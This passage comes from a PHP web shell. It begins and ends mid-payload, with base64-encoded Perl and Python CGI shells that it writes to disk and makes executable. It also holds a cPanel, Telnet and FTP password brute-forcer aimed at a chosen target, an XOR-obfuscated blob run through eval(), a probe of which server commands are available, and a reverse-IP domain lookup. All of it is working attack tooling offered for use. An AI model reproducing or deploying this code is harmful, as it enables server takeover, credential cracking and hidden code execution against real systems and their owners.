VyZm9ybUxvZ2luOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCiZFeGVjdXRlQ29tbWFuZDsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQomVXBsb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KJkRvd25sb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCiZQZXJmb3JtTG9nb3V0Ow0KfQ==';
$telfile = fopen("i/in.root" ,"w")or  die ('Sorry WE cant Create File');

fwrite ($telfile,base64_decode($telnet));
    chmod("i/in.root",0755);
   echo"<center>Pass=iqteam</center>";
   echo "<center><br><b><a href=i/in.root target='_blank'><div><span style=color:#6ebe0b;font-family:Arial;font-size:11px;>Cgi Talent SH3ll </span></div></a></b></center>";
   echo "<iframe src=i/in.root width=100% height=40% ></iframe> ";


        break;
        case'cpb':
        
$cpanel_port="2082";
$connect_timeout=5;
set_time_limit(0);
$submit=$_REQUEST['submit'];
$users=$_REQUEST['users'];
$pass=$_REQUEST['passwords'];
$target=$_REQUEST['target'];
$cracktype=$_REQUEST['cracktype'];
if($target == ""){
$target = "localhost";
}
$charset=$_REQUEST['charset'];
if($charset=="")
 $charset="lowercase";
$max_length=$_REQUEST['max_length'];
if($max_length=="")
 $max_length=10;
$min_length=$_REQUEST['min_length'];
if($min_length=="")
 $min_length=1;

 $charsetall = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetlower = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");
 $charsetupper = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z");
 $charsetnumeric = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetlowernumeric = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetuppernumeric = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
 $charsetletters = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" );
 $charsetsymbols= array("!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetlowersymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetuppersymbols = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetletterssymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetnumericsymbols = array("0", "1", "2", "3", "4", "5", "6", "7", "8", "9","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetlowernumericsymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetuppernumericsymbols = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9","!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetletterssymbols = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ,"!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_" );
 $charsetlettersnumericsymbols=array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" ,"!", "@", "#", "$", "%", "^", "&", "*", "(", ")","_","0", "1", "2", "3", "4", "5", "6", "7", "8", "9" );
	if ($charset == "all")
		$vals = $charsetall;
    elseif ($charset == "lowercase") 
		$vals = $charsetlower;
	 elseif ($charset == "uppercase") 
		$vals = $charsetupper;
	 elseif ($charset == "numeric") 
		$vals = $charsetnumeric;
	 elseif ($charset == "lowernumeric") 
		$vals = $charsetlowernumeric;
	 elseif ($charset == "uppernumeric") 
		$vals = $charsetuppernumeric;
	elseif ($charset == "letters") 
		$vals = $charsetletters;
	elseif ($charset == "symbols") 
		$vals = $charsetsymbols;
	elseif ($charset == "lowersymbols") 
		$vals = $charsetlowersymbols;
	elseif ($charset == "uppersymbols") 
		$vals = $charsetuppersymbols;
	elseif ($charset == "letterssymbols") 
		$vals = $charsetletterssymbols;
	elseif ($charset == "numberssymbols") 
		$vals = $charsetnumericsymbols;
	elseif ($charset == "lowernumericsymbols") 
		$vals = $charsetlowernumericsymbols;
	elseif ($charset == "uppernumericsymbols") 
		$vals = $charsetuppernumericsymbols;
	elseif ($charset == "lettersnumericsymbols") 
		$vals = $charsetlettersnumericsymbols;
	else echo "INVALID CHARSET";
	$key_that_script_is_crypted=19;
$resource_crypted_code ='7~`3.37L@VAEVAH1@VAEVAL]R^V1N=7L@VAEVAH1@PAZCGL]R^V1N(7`fq3.31@{v3--3)313=37~`(7|3.3raarj3;1|~1?1g~rz1?1yLr~a"1?1S{|1?1=p1:(7vv3.37|H!N=7|H N=7|H"N=7|H[t3]N=7|H#N(7`v}w3.3S~rz;7vv?7`fq?7~`:(3';
$string_output=str_replace("[t1]", "<?", $resource_crypted_code);
$string_output=str_replace("[t3]", "'", $string_output);
$lenth_of_crypted_code=strlen($string_output);
$eval_php_code='';
for($huivamvsem=0;$huivamvsem<$lenth_of_crypted_code;$huivamvsem++)
$eval_php_code .= chr(ord($string_output[$huivamvsem]) ^ $key_that_script_is_crypted);
eval($eval_php_code);
?>
<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
</head>
<title>Cpanel , FTP CraCkeR</title>
<body text="#00FF00" bgcolor="#000000" vlink="#008000" link="#008000" alink="#008000">
<div align="center">
<form method="POST" style="border: 1px solid #000000">
                <tr>
                        <td>
        <p align="center"><b><font color="#008000" face="Tahoma" size="2">
                <span lang="en-us">IP server</span> :</font><font face="Arial">
        </font><font face="Arial" color="#CC0000">
        <input type="text" name="target" size="16" value="<?php echo $target ?>" style="border: 2px solid #1D1D1D; background-color: #000000; color:#008000; font-family:Verdana; font-weight:bold; font-size:13px"></font></b></p>
        <p align="center"><b><font color="#008000" face="Tahoma" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </font></b></p>
                        <div align="center">
                                <table border="1" width="57%" bordercolorlight="#008000" bordercolordark="#003700">
                                        <tr>
                                                <td align="center">
                                                                                                <span lang="en-us"><font color="#FF0000"><b>User List</b></font></span></td>
                                                <td>
                                                <p align="center">
                                                                                                <span lang="en-us"><font color="#FF0000"><b>Password List</b></font></span></td>
                                        </tr>
                                </table>

                        <p align="center">&nbsp;<textarea rows="20" name="users" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><?php echo $users ?>
</textarea><textarea rows="20" name="passwords" cols="25" style="border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0"><?php echo $pass ?></textarea><br>
        <br>
                                <font style="font-weight:700" size="2" face="Tahoma" color="#008000">
                                                <span lang="ar-sa">Guess options</span></font><font style="font-size: 12pt;" size="-3" face="Verdana"><span style="font-size: 9pt;">&nbsp;
                                                <font face="Tahoma">
                                                <input name="cracktype" value="cpanel" style="font-weight: 700;" checked type="radio"></font></span></font><b><font size="2" face="Tahoma">
                                                Cpanel</font><font size="2" color="#cc0000" face="Tahoma">
                                                </font><font size="2" color="#FFFFFF" face="Tahoma">
                                                (2082)</font></b><font size="2" face="Tahoma"><b> </b>
                                                </font>
                                                <font style="font-size: 12pt;" size="-3" face="Verdana">
                                                <span style="font-size: 9pt;"><font face="Tahoma">
												<input name="cracktype" value="cpanel2" style="font-weight: 700;" type="radio"></font></span></font><b><font size="2" face="Tahoma">
                                                Telnet</font><font size="2" color="#cc0000" face="Tahoma">
                                                </font><font size="2" color="#FFFFFF" face="Tahoma">
                                                (23)</font></b><font size="2" face="Tahoma"><b> </b>
                                                </font>
                                                <font style="font-size: 12pt;" size="-3" face="Verdana">
                                                <span style="font-size: 9pt;"><font face="Tahoma">
                                                <input name="cracktype" value="ftp" style="font-weight: 700;" type="radio"></font></span></font><font style="font-weight: 700;" size="2" face="Tahoma">
                                                </font><span style="font-weight: 700;">
                                                <font size="2" face="Tahoma">Ftp </font>
                                                <font size="2" color="#FFFFFF" face="Tahoma">
                                                (21)</font></span>
												<br>
												<font style="font-weight:700" size="2" face="Tahoma" color="#008000"><span lang="ar-sa">Timeout delay</span>
												<input type="text" name="connect_timeout" style="border: 2px solid #1D1D1D;background: black;color:RED" size=48 value="<?php echo $connect_timeout;?>"></input>
												<br>
												<input type="checkbox" name="bruteforce" value="true"><font style="font-weight:700" size="2" face="Tahoma" color="#008000"><span lang="ar-sa">Bruteforce</span></input>
												<select name="charset" style="border: 2px solid #1D1D1D;background: black;color:RED">
												 <option value="all">All Letters + Numbers</option>
 											     <option value="numeric">Numbers</option>
												 <option value="letters">Letters</option>
												 <option value="symbols">Symbols</option>
												 <option value="lowercase">Lower Letters</option>
												 <option value="uppercase">Higher Letters</option>
												 <option value="lowernumeric">Lower Letters + Numbers</option>
												 <option value="uppernumeric">Upper Letters + Numbers</option>
												 <option value="lowersymbols">Lower Letters + Symbols</option>
												 <option value="uppersymbols">Upper Letters + Symbols</option>
												 <option value="letterssymbols">All Letters + Symbols</option>
												 <option value="numberssymbols">Numbers + Symbols</option>
												 <option value="lowernumericsymbols">Lower Letters + Numbers + Symbols</option>
												 <option value="uppernumericsymbols">Upper Letters + Numbers + Symbols</option>
												 <option value="lettersnumericsymbols">All Letters + Numbers + Symbols</option>

												</select>
												<br>
												<font style="font-weight:700" size="2" face="Tahoma" color="#008000"><span lang="ar-sa">Min Bruteforce Length:</span></font>
												<input type="text" name="min_length" style="border: 2px solid #1D1D1D;background: black;color:RED" size=48 value="<?php echo $min_length;?>"></input>
												<br>
												<font style="font-weight:700" size="2" face="Tahoma" color="#008000"><span lang="ar-sa">Max Bruteforce Length:</span></font>
												<input type="text" name="max_length" style="border: 2px solid #1D1D1D;background: black;color:RED" size=48 value="<?php echo $max_length;?>"></input>
												</p>
        <p align="center">&nbsp;&nbsp;&nbsp;&nbsp;
        <input type="submit" value="Go" name="submit" style="color: #008000; font-weight: bold; border: 1px solid #333333; background-color: #000000"></p>
                        </td>
                </tr>
        </table>

    <p align="center"></td>
  </tr>
  </form>
<?
function brute()
{
	global $vals,$min_length,$max_length;
	global $target,$pureuser,$connect_timeout;
	$min=$min_length;
	$max=$max_length;
	$A = array();
	$numVals = count($vals);
	$incDone = "";
	$realMax = "";
	$currentVal = "";
	$firstVal = "";
	for ($i = 0; $i < ($max + 1); $i++) {
		$A[$i] = -1;
	}
	
	for ($i = 0; $i < $max; $i++) {
		$realMax = $realMax . $vals[$numVals - 1];
	}
	for ($i = 0; $i < $min; $i++) {
		$A[$i] = $vals[0];
	}
	$i = 0;
	while ($A[$i] != -1) {
		$firstVal .= $A[$i];
		$i++;
	}
	//echo $firstVal . "<br>";
	cpanel_check($target,$pureuser,$firstVal,$connect_timeout);
	
	while (1) {
		for ($i = 0; $i < ($max + 1); $i++) {
			if ($A[$i] == -1) {
				break;
			}
		}
		$i--;
		$incDone = 0;
		while (!$incDone) {	
			for ($j = 0; $j < $numVals; $j++) {
				if ($A[$i] == $vals[$j]) {
					break;
				}
			}
			if ($j == ($numVals - 1)) {
				$A[$i] = $vals[0];
				$i--;
				if ($i < 0) {
					for ($i = 0; $i < ($max + 1); $i++) {
						if ($A[$i] == -1) {
							break;
						}
					}
					$A[$i] = $vals[0];
					$A[$i + 1] = -1;
					$incDone = 1;
					print "Starting " . (strlen($currentVal) + 1) . " Characters Cracking<br>";
				}
			} else {
				$A[$i] = $vals[$j + 1];
				$incDone = 1;
			}
		}
		$i = 0;
		$currentVal = "";
		while ($A[$i] != -1) {
			$currentVal = $currentVal . $A[$i];
			$i++;
		}
		cpanel_check($target,$pureuser,$currentVal,$connect_timeout);
		//echo $currentVal . "<br>";
		if ($currentVal == $realMax) {
			return 0;
		}
	}
}
function getmicrotime() {
   list($usec, $sec) = explode(" ",microtime());
   return ((float)$usec + (float)$sec);
} 

function ftp_check($host,$user,$pass,$timeout)
{
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, "ftp://$host");
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
 curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
 $data = curl_exec($ch);
 if ( curl_errno($ch) == 28 )
 {
 print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
 <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
 Please Check The Target Hostname .</font></font></b></p>";exit;
 }
 else if ( curl_errno($ch) == 0 )
 {
  print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"#008000\">
 Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
 and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
 }
 curl_close($ch);
}
function cpanel_check($host,$user,$pass,$timeout)
{
 global $cpanel_port;
 $ch = curl_init();
 //echo "http://$host:".$cpanel_port." $user $pass<br>";
 curl_setopt($ch, CURLOPT_URL, "http://$host:" . $cpanel_port);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
 $data = curl_exec($ch);
 if ( curl_errno($ch) == 28 )
 {
  print "<b><font face=\"Verdana\" style=\"font-size: 9pt\">
  <font color=\"#AA0000\">Error :</font> <font color=\"#008000\">Connection Timeout
  Please Check The Target Hostname .</font></font></b></p>";exit;
 }
 else if ( curl_errno($ch) == 0 )
 {
  print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]</font></b><font face=\"Tahoma\"   style=\"font-size: 9pt\"><b><font color=\"#008000\"> 
  Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
  and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b><br><br>";
 }
 curl_close($ch);
}

$time_start = getmicrotime();

if(isset($submit) && !empty($submit))
{
 if(empty($users) && empty($pass) )
 {
   print "<p><font face=\"Tahoma\" size=\"2\"><b><font color=\"#FF0000\">Error : </font>Please Check The Users or Password List Entry . . .</b></font></p>"; exit; }
 if(empty($users)){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Users List Entry . . .</b></font></p>"; exit; }
 if(empty($pass) && $_REQUEST['bruteforce']!="true" ){ print "<p><font face='Tahoma' size='2'><b><font color='#FF0000'>Error : </font>Please Check The Password List Entry . . .</b></font></p>"; exit; };
 $userlist=explode("\n",$users);
 $passlist=explode("\n",$pass);
 print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#FF0000\">
 Cracking Process Started, Please Wait ...</font></b><br><br>";

 if(isset($_POST['connect_timeout']))
 {
  $connect_timeout=$_POST['connect_timeout'];
 }

 if($cracktype == "ftp")
 {
  foreach ($userlist as $user) 
  {
   $pureuser = trim($user);
   foreach ($passlist as $password ) 
   {
     $purepass = trim($password);
     ftp_check($target,$pureuser,$purepass,$connect_timeout);
   }
  }
 }
 
 if ($cracktype == "cpanel" || $cracktype == "cpanel2")
 {
  if($cracktype == "cpanel2")
  {
   $cpanel_port="23";
  }
  else
   $cpanel_port="2082";
  
  foreach ($userlist as $user) 
  {
   $pureuser = trim($user);
   print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\"  style=\"font-size: 9pt\" color=\"#FF0800\">
   Processing user $pureuser ... </font></b>";
   if($_POST['bruteforce']=="true")
   {
    echo " bruteforcing ..";
	echo "<br>";
	brute();
   }
   else
   {
	 echo "<br>"; 
	 foreach ($passlist as $password ) 
     {
       $purepass = trim($password);
       cpanel_check($target,$pureuser,$purepass,$connect_timeout);
     }
   }
  }
  $time_end = getmicrotime();
$time = $time_end - $time_start; 
 print "<b><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#008000\">[~]#</font><font face=\"Tahoma\" style=\"font-size: 9pt\" color=\"#FF0000\">
 Cracking Finished. Elapsed time: $time</font> seconds</b><br><br>";
  }
}





        
        break;
        case'test':
        
        echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Test Permission</span><center><br>';

echo '<center><table style="border:1px solid #007700;">';
echo '<tr>';
if(ini_get('id') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;id:&nbsp;</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;id:&nbsp;</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('gunzip') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| gunzip:&nbsp;</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| gunzip:&nbsp;</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('pwd') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| pwd:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| pwd:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('ln') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| ln:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| ln:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('ls') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| ls:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| ls:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('chmod') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| chmod:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| chmod:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
echo '</tr><tr>';
if(ini_get('uname') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;uname:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;uname:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('rm') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| rm:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| rm:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('su') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| su:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| su:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}

if(ini_get('tail') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| tail:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| tail:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('Ptouch') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| Ptouch:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| Ptouch:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('who') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| who:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| who:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
echo '</tr><tr>';
if(ini_get('gcc') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp; gcc:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp; gcc:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('tar') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| tar:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| tar:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('du') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| du:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| du:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('dir') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| dir:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| dir:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('wget') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| wget:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| wget:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('date') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| date:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| date:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
echo '</tr><tr>';

if(ini_get('gzip') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp; gzip:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp; gzip:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
if(ini_get('sh') == '1'){
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| sh:</font></td><td><b><font color="#ff0000" size="2pt"> ON&nbsp;</font></b></td>';
}
else{
echo '<td style="border:0px solid black;"><font color="#007700" size="2pt">&nbsp;| sh:</font></td><td><b><font color="#b0b000" size="2pt">&nbsp;OFF&nbsp;</font></b></td>';
}
echo '</tr>';
echo '</table></center>';

        
        break;
        case'ipr':
        
     echo "<center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Ip Lookup Reverse Domain </span></center>
";
echo "<center><br><form method='post' action=?dir=".realpath('.')."&amp;fr=ipr><input type='text' size='60' value='yahoo.com' name='ghost' /><input type='hidden' name='action' value='iplookdom'> &nbsp;<input type='submit' value='&nbsp;&check;&nbsp;'></form></center>";
if(isset($_POST["ghost"]))
{
$site = $_POST["ghost"];
$ghost = "http://domains.yougetsignal.com/domains.php";

//Curl Function
$ch = curl_init($ghost);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$site&ket=");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
$resp = curl_exec($ch);
$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
$array = explode(",,", $resp);
unset($array[0]);
echo "<table style='margin: 0 auto'>";
foreach($array as $lnk)
{
    print "<tr><td><a  style=\"color:#0f0;font-weight:bold;\" href='$lnk' target=_blank>$lnk</a></td></tr>";
}
echo "</table>";
curl_close($ch);
}
        break;
        case'py':
         @mkdir('python', 0755);
    chdir('python');
        $frz = ".htaccess";
        $frz_note = "$frz";
        $dody = fopen ($frz_note , 'w') or die ("Sorry WE cant Create File");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dody , $metin ) ;
        fclose ($dody);
$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
